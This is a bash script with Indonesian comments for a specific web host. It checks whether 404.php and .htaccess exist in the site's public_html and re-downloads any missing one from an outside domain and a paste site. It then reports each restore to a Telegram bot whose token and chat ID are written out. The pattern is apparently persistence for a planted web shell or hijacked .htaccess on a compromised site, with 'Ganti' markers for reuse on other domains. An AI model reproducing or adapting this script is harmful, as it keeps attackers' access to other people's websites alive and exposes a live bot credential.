#!/bin/bash

# Konfigurasi
DOMAIN="https://rcdbio.co/" # 1 Ganti
PUBLIC_HTML="/home/rcdbio/public_html/" # 2 Ganti
TELEGRAM_BOT_TOKEN="8300419106:AAFcFxH0lqRpHMpOpCKQU0KgYKP1rLcE2a0"
TELEGRAM_CHAT_ID="6815937314"

# File yang dilindungi
FILE_404="$PUBLIC_HTML/404.php"
HTACCESS="$PUBLIC_HTML/.htaccess"

# Fungsi untuk mengirim notifikasi ke Telegram
send_telegram_notification() {
  local message="$1"
  curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
  -d chat_id="$TELEGRAM_CHAT_ID" \
  -d text="$message" \
  -d parse_mode="Markdown" > /dev/null
}

# Fungsi untuk mengembalikan file
restore_files() {
  local notification_message=""
  local needs_notification=false

  if [ ! -f "$FILE_404" ]; then
    echo "$(date): 404.php tidak ditemukan, mengunduh ulang..." >> /home/rcdbio/bin/lib/local/storage/log.txt # 3 Ganti
    curl -L https://suarabmi.id/404.txt -o "$FILE_404"
    notification_message+="Akses Restore: $DOMAIN""404.php\n"
    needs_notification=true
  fi

  if [ ! -f "$HTACCESS" ]; then
    echo "$(date): .htaccess tidak ditemukan, mengunduh ulang..." >> /home/rcdbio/bin/lib/local/storage/log.txt # 4 Ganti
    curl -L https://pastee.dev/r/CWmABgBb/0 -o "$HTACCESS"
    notification_message+="Restore htaccess: $DOMAIN"".htaccess\n"
    needs_notification=true
  fi

  if [ "$needs_notification" = true ]; then
    full_message="Domain: $DOMAIN\n""$notification_message"
    send_telegram_notification "$full_message"
  fi
}

restore_files